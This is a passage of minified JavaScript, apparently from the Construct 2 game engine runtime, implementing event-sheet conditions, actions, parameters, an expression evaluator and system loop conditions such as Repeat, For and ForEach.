                    for (t = 0, e = this.subevents.length; t < e; t++) i = this.subevents[t], (n = !this.toplevelgroup || !this.group && t < r) && this.runtime.pushCopySol(i.solModifiers), i.run(), n ? this.runtime.popSol(i.solModifiers) : this.runtime.clearSol(i.solModifiers);
                else
                    for (t = 0, e = this.subevents.length; t < e; t++) this.subevents[t].run();
                this.runtime.popEventStack()
            }
        }, o.prototype.run_pretrigger = function () {
            var t = this.runtime.getCurrentEventStack();
            t.current_event = this;
            var e, i = !1;
            for (t.cndindex = 0, e = this.conditions.length; t.cndindex < e; t.cndindex++)
                if (this.conditions[t.cndindex].run()) i = !0;
                else if (!this.orblock) return !1;
            return !this.orblock || i
        }, o.prototype.retrigger = function () {
            this.runtime.execcount++;
            var t, e = this.runtime.getCurrentEventStack().cndindex,
                i = this.runtime.pushEventStack(this);
            if (!this.orblock)
                for (i.cndindex = e + 1, t = this.conditions.length; i.cndindex < t; i.cndindex++)
                    if (!this.conditions[i.cndindex].run()) return this.runtime.popEventStack(), !1;
            return this.run_actions_and_subevents(), this.runtime.popEventStack(), !0
        }, o.prototype.isFirstConditionOfType = function (t) {
            var e = t.index;
            if (0 === e) return !0;
            for (--e; e >= 0; --e)
                if (this.conditions[e].type === t.type) return !1;
            return !0
        }, cr.eventblock = o, h.prototype.postInit = function () {
            var t, e, i;
            for (t = 0, e = this.parameters.length; t < e; t++)(i = this.parameters[t]).postInit(), i.variesPerInstance && (this.anyParamVariesPerInstance = !0)
        }, h.prototype.run_true = function () {
            return !0
        }, h.prototype.run_system = function () {
            var t, e;
            for (t = 0, e = this.parameters.length; t < e; t++) this.results[t] = this.parameters[t].get();
            return cr.xor(this.func.apply(this.runtime.system, this.results), this.inverted)
        }, h.prototype.run_static = function () {
            var t, e;
            for (t = 0, e = this.parameters.length; t < e; t++) this.results[t] = this.parameters[t].get();
            var i = this.func.apply(this.behaviortype ? this.behaviortype : this.type, this.results);
            return this.type.applySolToContainer(), i
        }, h.prototype.run_object = function () {
            var t, e, i, n, r, s, o, a, h, c, l, u, p = this.type,
                d = p.getCurrentSol(),
                f = this.block.orblock && !this.trigger,
                m = 0,
                g = p.is_contained,
                y = p.is_family,
                _ = p.family_index,
                v = this.beh_index,
                b = v > -1,
                w = this.anyParamVariesPerInstance,
                x = this.parameters,
                S = this.results,
                T = this.inverted,
                C = this.func;
            if (w)
                for (e = 0, r = x.length; e < r; ++e)(s = x[e]).variesPerInstance || (S[e] = s.get(0));
            else
                for (e = 0, r = x.length; e < r; ++e) S[e] = x[e].get(0);
            if (d.select_all) {
                for (cr.clearArray(d.instances), cr.clearArray(d.else_instances), t = 0, n = (l = p.instances).length; t < n; ++t) {
                    if (a = l[t], w)
                        for (e = 0, r = x.length; e < r; ++e)(s = x[e]).variesPerInstance && (S[e] = s.get(t));
                    b ? (m = 0, y && (m = a.type.family_beh_map[_]), o = C.apply(a.behavior_insts[v + m], S)) : o = C.apply(a, S), cr.xor(o, T) ? d.instances.push(a) : f && d.else_instances.push(a)
                }
                return p.finish && p.finish(!0), d.select_all = !1, p.applySolToContainer(), d.hasObjects()
            }
            i = 0;
            var A = f && !this.block.isFirstConditionOfType(this),
                O = !1;
            for (t = 0, n = (l = A ? d.else_instances : d.instances).length; t < n; ++t) {
                if (a = l[t], w)
                    for (e = 0, r = x.length; e < r; ++e)(s = x[e]).variesPerInstance && (S[e] = s.get(t));
                if (b ? (m = 0, y && (m = a.type.family_beh_map[_]), o = C.apply(a.behavior_insts[v + m], S)) : o = C.apply(a, S), cr.xor(o, T))
                    if (O = !0, A) {
                        if (d.instances.push(a), g)
                            for (e = 0, r = a.siblings.length; e < r; e++)(h = a.siblings[e]).type.getCurrentSol().instances.push(h)
                    } else {
                        if (l[i] = a, g)
                            for (e = 0, r = a.siblings.length; e < r; e++)(h = a.siblings[e]).type.getCurrentSol().instances[i] = h;
                        i++
                    }
                else if (A) {
                    if (l[i] = a, g)
                        for (e = 0, r = a.siblings.length; e < r; e++)(h = a.siblings[e]).type.getCurrentSol().else_instances[i] = h;
                    i++
                } else if (f && (d.else_instances.push(a), g))
                    for (e = 0, r = a.siblings.length; e < r; e++)(h = a.siblings[e]).type.getCurrentSol().else_instances.push(h)
            }
            if (cr.truncateArray(l, i), g)
                for (t = 0, n = (u = p.container).length; t < n; t++) c = u[t].getCurrentSol(), A ? cr.truncateArray(c.else_instances, i) : cr.truncateArray(c.instances, i);
            var k = O;
            if (A && !O)
                for (t = 0, n = d.instances.length; t < n; t++) {
                    if (a = d.instances[t], w)
                        for (e = 0, r = x.length; e < r; e++)(s = x[e]).variesPerInstance && (S[e] = s.get(t));
                    if (o = b ? C.apply(a.behavior_insts[v], S) : C.apply(a, S), cr.xor(o, T)) {
                        O = !0;
                        break
                    }
                }
            return p.finish && p.finish(k || f), f ? O : d.hasObjects()
        }, cr.condition = h, c.prototype.postInit = function () {
            var t, e, i;
            for (t = 0, e = this.parameters.length; t < e; t++)(i = this.parameters[t]).postInit(), i.variesPerInstance && (this.anyParamVariesPerInstance = !0)
        }, c.prototype.run_system = function () {
            var t, e, i = this.runtime,
                n = this.parameters,
                r = this.results;
            for (t = 0, e = n.length; t < e; ++t) r[t] = n[t].get();
            return this.func.apply(i.system, r)
        }, c.prototype.run_object = function () {
            var t, e, i, n, r, s, o, a = this.type,
                h = this.beh_index,
                c = a.family_index,
                l = this.anyParamVariesPerInstance,
                u = this.parameters,
                p = this.results,
                d = this.func,
                f = a.getCurrentSol().getObjects(),
                m = a.is_family,
                g = h > -1;
            if (l)
                for (e = 0, n = u.length; e < n; ++e)(r = u[e]).variesPerInstance || (p[e] = r.get(0));
            else
                for (e = 0, n = u.length; e < n; ++e) p[e] = u[e].get(0);
            for (t = 0, i = f.length; t < i; ++t) {
                if (s = f[t], l)
                    for (e = 0, n = u.length; e < n; ++e)(r = u[e]).variesPerInstance && (p[e] = r.get(t));
                g ? (o = 0, m && (o = s.type.family_beh_map[c]), d.apply(s.behavior_insts[h + o], p)) : d.apply(s, p)
            }
            return !1
        }, cr.action = c;
        var l = [],
            u = -1;

        function p() {
            return u++, l.length === u && l.push(new cr.expvalue), l[u]
        }

        function d() {
            u--
        }

        function f(t, e) {
            var i, n, r;
            switch (this.owner = t, this.block = t.block, this.sheet = t.sheet, this.runtime = t.runtime, this.type = e[0], this.expression = null, this.solindex = 0, this.get = null, this.combosel = 0, this.layout = null, this.key = 0, this.object = null, this.index = 0, this.varname = null, this.eventvar = null, this.fileinfo = null, this.subparams = null, this.variadicret = null, this.subparams = null, this.variadicret = null, this.variesPerInstance = !1, e[0]) {
                case 0:
                case 7:
                    this.expression = new cr.expNode(this, e[1]), this.solindex = 0, this.get = this.get_exp;
                    break;
                case 1:
                    this.expression = new cr.expNode(this, e[1]), this.solindex = 0, this.get = this.get_exp_str;
                    break;
                case 5:
                    this.expression = new cr.expNode(this, e[1]), this.solindex = 0, this.get = this.get_layer;
                    break;
                case 3:
                case 8:
                    this.combosel = e[1], this.get = this.get_combosel;
                    break;
                case 6:
                    this.layout = this.runtime.layouts[e[1]], this.get = this.get_layout;
                    break;
                case 9:
                    this.key = e[1], this.get = this.get_key;
                    break;
                case 4:
                    this.object = this.runtime.types_by_index[e[1]], this.get = this.get_object, this.block.addSolModifier(this.object), this.owner instanceof cr.action ? this.block.setSolWriterAfterCnds() : this.block.parent && this.block.parent.setSolWriterAfterCnds();
                    break;
                case 10:
                    this.index = e[1], t.type && t.type.is_family ? (this.get = this.get_familyvar, this.variesPerInstance = !0) : this.get = this.get_instvar;
                    break;
                case 11:
                    this.varname = e[1], this.eventvar = null, this.get = this.get_eventvar;
                    break;
                case 2:
                case 12:
                    this.fileinfo = e[1], this.get = this.get_audiofile;
                    break;
                case 13:
                    for (this.get = this.get_variadic, this.subparams = [], this.variadicret = [], i = 1, n = e.length; i < n; i++) r = new cr.parameter(this.owner, e[i]), cr.seal(r), this.subparams.push(r), this.variadicret.push(0);
                    break;
                default:
            }
        }

        function m(t, e, i) {
            this.sheet = t, this.parent = e, this.runtime = t.runtime, this.solModifiers = [], this.name = i[1], this.vartype = i[2], this.initial = i[3], this.is_static = !!i[4], this.is_constant = !!i[5], this.sid = i[6], this.runtime.varsBySid[this.sid.toString()] = this, this.data = this.initial, this.parent ? (this.is_static || this.is_constant ? this.localIndex = -1 : this.localIndex = this.runtime.stackLocalCount++, this.runtime.all_local_vars.push(this)) : (this.localIndex = -1, this.runtime.all_global_vars.push(this))
        }

        function g(t, e, i) {
            this.sheet = t, this.parent = e, this.runtime = t.runtime, this.solModifiers = [], this.include_sheet = null, this.include_sheet_name = i[1], this.active = !0
        }

        function y() {
            this.temp_parents_arr = [], this.reset(null), cr.seal(this)
        }
        f.prototype.postInit = function () {
            var t, e;
            if (11 === this.type) this.eventvar = this.runtime.getEventVariableByName(this.varname, this.block.parent);
            else if (13 === this.type)
                for (t = 0, e = this.subparams.length; t < e; t++) this.subparams[t].postInit();
            this.expression && this.expression.postInit()
        }, f.prototype.maybeVaryForType = function (t) {
            this.variesPerInstance || t && (t.plugin.singleglobal || (this.variesPerInstance = !0))
        }, f.prototype.setVaries = function () {
            this.variesPerInstance = !0
        }, f.prototype.get_exp = function (t) {
            this.solindex = t || 0;
            var e = p();
            return this.expression.get(e), d(), e.data
        }, f.prototype.get_exp_str = function (t) {
            this.solindex = t || 0;
            var e = p();
            return this.expression.get(e), d(), cr.is_string(e.data) ? e.data : ""
        }, f.prototype.get_object = function () {
            return this.object
        }, f.prototype.get_combosel = function () {
            return this.combosel
        }, f.prototype.get_layer = function (t) {
            this.solindex = t || 0;
            var e = p();
            return this.expression.get(e), d(), e.is_number() ? this.runtime.getLayerByNumber(e.data) : this.runtime.getLayerByName(e.data)
        }, f.prototype.get_layout = function () {
            return this.layout
        }, f.prototype.get_key = function () {
            return this.key
        }, f.prototype.get_instvar = function () {
            return this.index
        }, f.prototype.get_familyvar = function (t) {
            var e = t || 0,
                i = this.owner.type,
                n = null,
                r = i.getCurrentSol(),
                s = r.getObjects();
            if (s.length) n = s[e % s.length].type;
            else if (r.else_instances.length) n = r.else_instances[e % r.else_instances.length].type;
            else {
                if (!i.instances.length) return 0;
                n = i.instances[e % i.instances.length].type
            }
            return this.index + n.family_var_map[i.family_index]
        }, f.prototype.get_eventvar = function () {
            return this.eventvar
        }, f.prototype.get_audiofile = function () {
            return this.fileinfo
        }, f.prototype.get_variadic = function () {
            var t, e;
            for (t = 0, e = this.subparams.length; t < e; t++) this.variadicret[t] = this.subparams[t].get();
            return this.variadicret
        }, cr.parameter = f, m.prototype.postInit = function () {
            this.solModifiers = n(this.solModifiers)
        }, m.prototype.setValue = function (t) {
            var e = this.runtime.getCurrentLocalVarStack();
            this.parent && !this.is_static && e ? (this.localIndex >= e.length && (e.length = this.localIndex + 1), e[this.localIndex] = t) : this.data = t
        }, m.prototype.getValue = function () {
            var t = this.runtime.getCurrentLocalVarStack();
            return !this.parent || this.is_static || !t || this.is_constant ? this.data : this.localIndex >= t.length || void 0 === t[this.localIndex] ? this.initial : t[this.localIndex]
        }, m.prototype.run = function () {
            !this.parent || this.is_static || this.is_constant || this.setValue(this.initial)
        }, cr.eventvariable = m, g.prototype.toString = function () {
            return "include:" + this.include_sheet.toString()
        }, g.prototype.postInit = function () {
            this.include_sheet = this.runtime.eventsheets[this.include_sheet_name], this.sheet.includes.add(this), this.solModifiers = n(this.solModifiers);
            for (var t = this.parent; t;) t.group && t.contained_includes.push(this), t = t.parent;
            this.updateActive()
        }, g.prototype.run = function () {
            this.parent && this.runtime.pushCleanSol(this.runtime.types_by_index), this.include_sheet.hasRun || this.include_sheet.run(!0), this.parent && this.runtime.popSol(this.runtime.types_by_index)
        }, g.prototype.updateActive = function () {
            for (var t = this.parent; t;) {
                if (t.group && !t.group_active) return void(this.active = !1);
                t = t.parent
            }
            this.active = !0
        }, g.prototype.isActive = function () {
            return this.active
        }, cr.eventinclude = g, y.prototype.reset = function (t) {
            this.current_event = t, this.cndindex = 0, this.actindex = 0, cr.clearArray(this.temp_parents_arr), this.last_event_true = !1, this.else_branch_ran = !1, this.any_true_state = !1
        }, y.prototype.isModifierAfterCnds = function () {
            return !!this.current_event.solWriterAfterCnds || this.cndindex < this.current_event.conditions.length - 1 && !!this.current_event.solModifiers.length
        }, cr.eventStackFrame = y
    }(),
    function () {
        function t(t, e) {
            this.owner = t, this.runtime = t.runtime, this.type = e[0], this.get = [this.eval_int, this.eval_float, this.eval_string, this.eval_unaryminus, this.eval_add, this.eval_subtract, this.eval_multiply, this.eval_divide, this.eval_mod, this.eval_power, this.eval_and, this.eval_or, this.eval_equal, this.eval_notequal, this.eval_less, this.eval_lessequal, this.eval_greater, this.eval_greaterequal, this.eval_conditional, this.eval_system_exp, this.eval_object_exp, this.eval_instvar_exp, this.eval_behavior_exp, this.eval_eventvar_exp][this.type];
            var i, n, r = null;
            switch (this.value = null, this.first = null, this.second = null, this.third = null, this.func = null, this.results = null, this.parameters = null, this.object_type = null, this.beh_index = -1, this.instance_expr = null, this.varindex = -1, this.behavior_type = null, this.varname = null, this.eventvar = null, this.return_string = !1, this.type) {
                case 0:
                case 1:
                case 2:
                    this.value = e[1];
                    break;
                case 3:
                    this.first = new cr.expNode(t, e[1]);
                    break;
                case 18:
                    this.first = new cr.expNode(t, e[1]), this.second = new cr.expNode(t, e[2]), this.third = new cr.expNode(t, e[3]);
                    break;
                case 19:
                    this.func = this.runtime.GetObjectReference(e[1]), this.func !== cr.system_object.prototype.exps.random && this.func !== cr.system_object.prototype.exps.choose || this.owner.setVaries(), this.results = [], this.parameters = [], 3 === e.length ? (r = e[2], this.results.length = r.length + 1) : this.results.length = 1;
                    break;
                case 20:
                    this.object_type = this.runtime.types_by_index[e[1]], this.beh_index = -1, this.func = this.runtime.GetObjectReference(e[2]), this.return_string = e[3], cr.plugins_.Function && this.func === cr.plugins_.Function.prototype.exps.Call && this.owner.setVaries(), e[4] ? this.instance_expr = new cr.expNode(t, e[4]) : this.instance_expr = null, this.results = [], this.parameters = [], 6 === e.length ? (r = e[5], this.results.length = r.length + 1) : this.results.length = 1;
                    break;
                case 21:
                    this.object_type = this.runtime.types_by_index[e[1]], this.return_string = e[2], e[3] ? this.instance_expr = new cr.expNode(t, e[3]) : this.instance_expr = null, this.varindex = e[4];
                    break;
                case 22:
                    this.object_type = this.runtime.types_by_index[e[1]], this.behavior_type = this.object_type.getBehaviorByName(e[2]), this.beh_index = this.object_type.getBehaviorIndexByName(e[2]), this.func = this.runtime.GetObjectReference(e[3]), this.return_string = e[4], e[5] ? this.instance_expr = new cr.expNode(t, e[5]) : this.instance_expr = null, this.results = [], this.parameters = [], 7 === e.length ? (r = e[6], this.results.length = r.length + 1) : this.results.length = 1;
                    break;
                case 23:
                    this.varname = e[1], this.eventvar = null;
                    break
            }
            if (this.owner.maybeVaryForType(this.object_type), this.type >= 4 && this.type <= 17 && (this.first = new cr.expNode(t, e[1]), this.second = new cr.expNode(t, e[2])), r)
                for (i = 0, n = r.length; i < n; i++) this.parameters.push(new cr.expNode(t, r[i]));
            cr.seal(this)
        }
        t.prototype.postInit = function () {
            var t, e;
            if (23 === this.type && (this.eventvar = this.owner.runtime.getEventVariableByName(this.varname, this.owner.block.parent)), this.first && this.first.postInit(), this.second && this.second.postInit(), this.third && this.third.postInit(), this.instance_expr && this.instance_expr.postInit(), this.parameters)
                for (t = 0, e = this.parameters.length; t < e; t++) this.parameters[t].postInit()
        };
        var e = [],
            i = -1;

        function n() {
            return ++i, e.length === i && e.push(new cr.expvalue), e[i]
        }

        function r() {
            --i
        }

        function s(t, e, i) {
            var n, r;
            for (n = 0, r = t.length; n < r; ++n) t[n].get(i), e[n + 1] = i.data
        }

        function o(t, e) {
            this.type = t || cr.exptype.Integer, this.data = e || 0, this.object_class = null, this.type == cr.exptype.Integer && (this.data = Math.floor(this.data)), cr.seal(this)
        }
        t.prototype.eval_system_exp = function (t) {
            var e = this.parameters,
                i = this.results;
            i[0] = t, s(e, i, n()), r(), this.func.apply(this.runtime.system, i)
        }, t.prototype.eval_object_exp = function (t) {
            var e = this.object_type,
                i = this.results,
                o = this.parameters,
                a = this.instance_expr,
                h = this.func,
                c = this.owner.solindex,
                l = e.getCurrentSol(),
                u = l.getObjects();
            if (!u.length) {
                if (!l.else_instances.length) return void(this.return_string ? t.set_string("") : t.set_int(0));
                u = l.else_instances
            }
            i[0] = t, t.object_class = e;
            var p = n();
            s(o, i, p), a && (a.get(p), p.is_number() && (c = p.data, u = e.instances)), r();
            var d = u.length;
            (c >= d || c <= -d) && (c %= d), c < 0 && (c += d);
            h.apply(u[c], i)
        }, t.prototype.eval_behavior_exp = function (t) {
            var e = this.object_type,
                i = this.results,
                o = this.parameters,
                a = this.instance_expr,
                h = this.beh_index,
                c = this.func,
                l = this.owner.solindex,
                u = e.getCurrentSol(),
                p = u.getObjects();
            if (!p.length) {
                if (!u.else_instances.length) return void(this.return_string ? t.set_string("") : t.set_int(0));
                p = u.else_instances
            }
            i[0] = t, t.object_class = e;
            var d = n();
            s(o, i, d), a && (a.get(d), d.is_number() && (l = d.data, p = e.instances)), r();
            var f = p.length;
            (l >= f || l <= -f) && (l %= f), l < 0 && (l += f);
            var m = p[l],
                g = 0;
            e.is_family && (g = m.type.family_beh_map[e.family_index]);
            c.apply(m.behavior_insts[h + g], i)
        }, t.prototype.eval_instvar_exp = function (t) {
            var e, i = this.instance_expr,
                s = this.object_type,
                o = this.varindex,
                a = this.owner.solindex,
                h = s.getCurrentSol(),
                c = h.getObjects();
            if (!c.length) {
                if (!h.else_instances.length) return void(this.return_string ? t.set_string("") : t.set_int(0));
                c = h.else_instances
            }
            if (i) {
                var l = n();
                if (i.get(l), l.is_number()) {
                    a = l.data;
                    var u = s.instances;
                    0 !== u.length && (a %= u.length) < 0 && (a += u.length);
                    var p = (e = s.getInstanceByIID(a)).instance_vars[o];
                    return cr.is_string(p) ? t.set_string(p) : t.set_float(p), void r()
                }
                r()
            }
            var d = c.length;
            (a >= d || a <= -d) && (a %= d), a < 0 && (a += d), e = c[a];
            var f = 0;
            s.is_family && (f = e.type.family_var_map[s.family_index]);
            p = e.instance_vars[o + f];
            cr.is_string(p) ? t.set_string(p) : t.set_float(p)
        }, t.prototype.eval_int = function (t) {
            t.type = cr.exptype.Integer, t.data = this.value
        }, t.prototype.eval_float = function (t) {
            t.type = cr.exptype.Float, t.data = this.value
        }, t.prototype.eval_string = function (t) {
            t.type = cr.exptype.String, t.data = this.value
        }, t.prototype.eval_unaryminus = function (t) {
            this.first.get(t), t.is_number() && (t.data = -t.data)
        }, t.prototype.eval_add = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data += e.data, e.is_float() && t.make_float()), r()
        }, t.prototype.eval_subtract = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data -= e.data, e.is_float() && t.make_float()), r()
        }, t.prototype.eval_multiply = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data *= e.data, e.is_float() && t.make_float()), r()
        }, t.prototype.eval_divide = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data /= e.data, t.make_float()), r()
        }, t.prototype.eval_mod = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data %= e.data, e.is_float() && t.make_float()), r()
        }, t.prototype.eval_power = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data = Math.pow(t.data, e.data), e.is_float() && t.make_float()), r()
        }, t.prototype.eval_and = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), e.is_string() || t.is_string() ? this.eval_and_stringconcat(t, e) : this.eval_and_logical(t, e), r()
        }, t.prototype.eval_and_stringconcat = function (t, e) {
            t.is_string() && e.is_string() ? this.eval_and_stringconcat_str_str(t, e) : this.eval_and_stringconcat_num(t, e)
        }, t.prototype.eval_and_stringconcat_str_str = function (t, e) {
            t.data += e.data
        }, t.prototype.eval_and_stringconcat_num = function (t, e) {
            t.is_string() ? t.data += (Math.round(1e10 * e.data) / 1e10).toString() : t.set_string(t.data.toString() + e.data)
        }, t.prototype.eval_and_logical = function (t, e) {
            t.set_int(t.data && e.data ? 1 : 0)
        }, t.prototype.eval_or = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.is_number() && e.is_number() && (t.data || e.data ? t.set_int(1) : t.set_int(0)), r()
        }, t.prototype.eval_conditional = function (t) {
            this.first.get(t), t.data ? this.second.get(t) : this.third.get(t)
        }, t.prototype.eval_equal = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data === e.data ? 1 : 0), r()
        }, t.prototype.eval_notequal = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data !== e.data ? 1 : 0), r()
        }, t.prototype.eval_less = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data < e.data ? 1 : 0), r()
        }, t.prototype.eval_lessequal = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data <= e.data ? 1 : 0), r()
        }, t.prototype.eval_greater = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data > e.data ? 1 : 0), r()
        }, t.prototype.eval_greaterequal = function (t) {
            this.first.get(t);
            var e = n();
            this.second.get(e), t.set_int(t.data >= e.data ? 1 : 0), r()
        }, t.prototype.eval_eventvar_exp = function (t) {
            var e = this.eventvar.getValue();
            cr.is_number(e) ? t.set_float(e) : t.set_string(e)
        }, cr.expNode = t, o.prototype.is_int = function () {
            return this.type === cr.exptype.Integer
        }, o.prototype.is_float = function () {
            return this.type === cr.exptype.Float
        }, o.prototype.is_number = function () {
            return this.type === cr.exptype.Integer || this.type === cr.exptype.Float
        }, o.prototype.is_string = function () {
            return this.type === cr.exptype.String
        }, o.prototype.make_int = function () {
            this.is_int() || (this.is_float() ? this.data = Math.floor(this.data) : this.is_string() && (this.data = parseInt(this.data, 10)), this.type = cr.exptype.Integer)
        }, o.prototype.make_float = function () {
            this.is_float() || (this.is_string() && (this.data = parseFloat(this.data)), this.type = cr.exptype.Float)
        }, o.prototype.make_string = function () {
            this.is_string() || (this.data = this.data.toString(), this.type = cr.exptype.String)
        }, o.prototype.set_int = function (t) {
            this.type = cr.exptype.Integer, this.data = Math.floor(t)
        }, o.prototype.set_float = function (t) {
            this.type = cr.exptype.Float, this.data = t
        }, o.prototype.set_string = function (t) {
            this.type = cr.exptype.String, this.data = t
        }, o.prototype.set_any = function (t) {
            cr.is_number(t) ? (this.type = cr.exptype.Float, this.data = t) : cr.is_string(t) ? (this.type = cr.exptype.String, this.data = t.toString()) : (this.type = cr.exptype.Integer, this.data = 0)
        }, cr.expvalue = o, cr.exptype = {
            Integer: 0,
            Float: 1,
            String: 2
        }
    }(), cr.system_object = function (t) {
        this.runtime = t, this.waits = []
    }, cr.system_object.prototype.saveToJSON = function () {
        var t, e, i, n, r, s, o, a, h = {};
        h.waits = [];
        var c, l = h.waits;
        for (t = 0, e = this.waits.length; t < e; t++) {
            for (c = {
                    t: (s = this.waits[t]).time,
                    st: s.signaltag,
                    s: s.signalled,
                    ev: s.ev.sid,
                    sm: [],
                    sols: {}
                }, s.ev.actions[s.actindex] && (c.act = s.ev.actions[s.actindex].sid), i = 0, n = s.solModifiers.length; i < n; i++) c.sm.push(s.solModifiers[i].sid);
            for (r in s.sols)
                if (s.sols.hasOwnProperty(r)) {
                    for (o = this.runtime.types_by_index[parseInt(r, 10)], a = {
                            sa: s.sols[r].sa,
                            insts: []
                        }, i = 0, n = s.sols[r].insts.length; i < n; i++) a.insts.push(s.sols[r].insts[i].uid);
                    c.sols[o.sid.toString()] = a
                } l.push(c)
        }
        return h
    }, cr.system_object.prototype.loadFromJSON = function (t) {
        var e, i, n, r, s, o, a, h, c, l, u, p, d, f = t.waits;
        for (cr.clearArray(this.waits), e = 0, i = f.length; e < i; e++)
            if (o = f[e], h = this.runtime.blocksBySid[o.ev.toString()]) {
                for (c = -1, n = 0, r = h.actions.length; n < r; n++)
                    if (h.actions[n].sid === o.act) {
                        c = n;
                        break
                    } if (-1 !== c) {
                    for ((a = {}).sols = {}, a.solModifiers = [], a.deleteme = !1, a.time = o.t, a.signaltag = o.st || "", a.signalled = !!o.s, a.ev = h, a.actindex = c, n = 0, r = o.sm.length; n < r; n++)(l = this.runtime.getObjectTypeBySid(o.sm[n])) && a.solModifiers.push(l);
                    for (s in o.sols)
                        if (o.sols.hasOwnProperty(s)) {
                            if (!(l = this.runtime.getObjectTypeBySid(parseInt(s, 10)))) continue;
                            for (p = {
                                    sa: (u = o.sols[s]).sa,
                                    insts: []
                                }, n = 0, r = u.insts.length; n < r; n++)(d = this.runtime.getObjectByUID(u.insts[n])) && p.insts.push(d);
                            a.sols[l.index.toString()] = p
                        } this.waits.push(a)
                }
            }
    },
    function () {
        var t = cr.system_object.prototype;

        function e() {}
        e.prototype.EveryTick = function () {
            return !0
        }, e.prototype.OnLayoutStart = function () {
            return !0
        }, e.prototype.OnLayoutEnd = function () {
            return !0
        }, e.prototype.Compare = function (t, e, i) {
            return cr.do_cmp(t, e, i)
        }, e.prototype.CompareTime = function (t, e) {
            var i = this.runtime.kahanTime.sum;
            if (0 === t) {
                var n = this.runtime.getCurrentCondition();
                return !n.extra.CompareTime_executed && i >= e && (n.extra.CompareTime_executed = !0, !0)
            }
            return cr.do_cmp(i, t, e)
        }, e.prototype.LayerVisible = function (t) {
            return !!t && t.visible
        }, e.prototype.LayerEmpty = function (t) {
            return !!t && !t.instances.length
        }, e.prototype.LayerCmpOpacity = function (t, e, i) {
            return !!t && cr.do_cmp(100 * t.opacity, e, i)
        }, e.prototype.Repeat = function (t) {
            var e, i = this.runtime.getCurrentEventStack(),
                n = i.current_event,
                r = i.isModifierAfterCnds(),
                s = this.runtime.pushLoopStack();
            if (r)
                for (e = 0; e < t && !s.stopped; e++) this.runtime.pushCopySol(n.solModifiers), s.index = e, n.retrigger(), this.runtime.popSol(n.solModifiers);
            else
                for (e = 0; e < t && !s.stopped; e++) s.index = e, n.retrigger();
            return this.runtime.popLoopStack(), !1
        }, e.prototype.While = function (t) {
            var e, i = this.runtime.getCurrentEventStack(),
                n = i.current_event,
                r = i.isModifierAfterCnds(),
                s = this.runtime.pushLoopStack();
            if (r)
                for (e = 0; !s.stopped; e++) this.runtime.pushCopySol(n.solModifiers), s.index = e, n.retrigger() || (s.stopped = !0), this.runtime.popSol(n.solModifiers);
            else
                for (e = 0; !s.stopped; e++) s.index = e, n.retrigger() || (s.stopped = !0);
            return this.runtime.popLoopStack(), !1
        }, e.prototype.For = function (t, e, i) {
            var n, r = this.runtime.getCurrentEventStack(),
                s = r.current_event,
                o = r.isModifierAfterCnds(),
                a = this.runtime.pushLoopStack(t);
            if (i < e)
                if (o)
                    for (n = e; n >= i && !a.stopped; --n) this.runtime.pushCopySol(s.solModifiers), a.index = n, s.retrigger(), this.runtime.popSol(s.solModifiers);
                else
                    for (n = e; n >= i && !a.stopped; --n) a.index = n, s.retrigger();
            else if (o)
                for (n = e; n <= i && !a.stopped; ++n) this.runtime.pushCopySol(s.solModifiers), a.index = n, s.retrigger(), this.runtime.popSol(s.solModifiers);
            else
                for (n = e; n <= i && !a.stopped; ++n) a.index = n, s.retrigger();
            return this.runtime.popLoopStack(), !1
        };
        var i = [],
            n = -1;

        function r(t, e) {
            var i = t.extra.c2_feo_val,
                n = e.extra.c2_feo_val;
            return cr.is_number(i) && cr.is_number(n) ? i - n : (i = "" + i) < (n = "" + n) ? -1 : i > n ? 1 : 0
        }
        e.prototype.ForEach = function (t) {
            var e = t.getCurrentSol();
            n++, i.length === n && i.push([]);
            var r = i[n];
            cr.shallowAssignArray(r, e.getObjects());
            var s, o, a, h, c, l, u, p = this.runtime.getCurrentEventStack(),
                d = p.current_event,
                f = p.isModifierAfterCnds(),
                m = this.runtime.pushLoopStack(),
                g = t.is_contained;
            if (f)
                for (s = 0, o = r.length; s < o && !m.stopped; s++) {
                    if (this.runtime.pushCopySol(d.solModifiers), c = r[s], (e = t.getCurrentSol()).select_all = !1, cr.clearArray(e.instances), e.instances[0] = c, g)
                        for (a = 0, h = c.siblings.length; a < h; a++)(u = (l = c.siblings[a]).type.getCurrentSol()).select_all = !1, cr.clearArray(u.instances), u.instances[0] = l;
                    m.index = s, d.retrigger(), this.runtime.popSol(d.solModifiers)
                } else
                    for (e.select_all = !1, cr.clearArray(e.instances), s = 0, o = r.length; s < o && !m.stopped; s++) {
                        if (c = r[s], e.instances[0] = c, g)
                            for (a = 0, h = c.siblings.length; a < h; a++)(u = (l = c.siblings[a]).type.getCurrentSol()).select_all = !1, cr.clearArray(u.instances), u.instances[0] = l;
                        m.index = s, d.retrigger()
                    }
            return cr.clearArray(r), this.runtime.popLoopStack(), n--, !1
        }, e.prototype.ForEachOrdered = function (t, e, s) {
            var o = t.getCurrentSol();
            n++, i.length === n && i.push([]);
            var a = i[n];
            cr.shallowAssignArray(a, o.getObjects());
            var h, c, l, u, p, d, f, m = this.runtime.getCurrentEventStack(),
                g = m.current_event,
                y = this.runtime.getCurrentCondition(),
                _ = m.isModifierAfterCnds(),
                v = this.runtime.pushLoopStack();
            for (h = 0, c = a.length; h < c; h++) a[h].extra.c2_feo_val = y.parameters[1].get(h);
            a.sort(r), 1 === s && a.reverse();
            var b = t.is_contained;
            if (_)
                for (h = 0, c = a.length; h < c && !v.stopped; h++) {
                    if (this.runtime.pushCopySol(g.solModifiers), p = a[h], (o = t.getCurrentSol()).select_all = !1, cr.clearArray(o.instances), o.instances[0] = p, b)
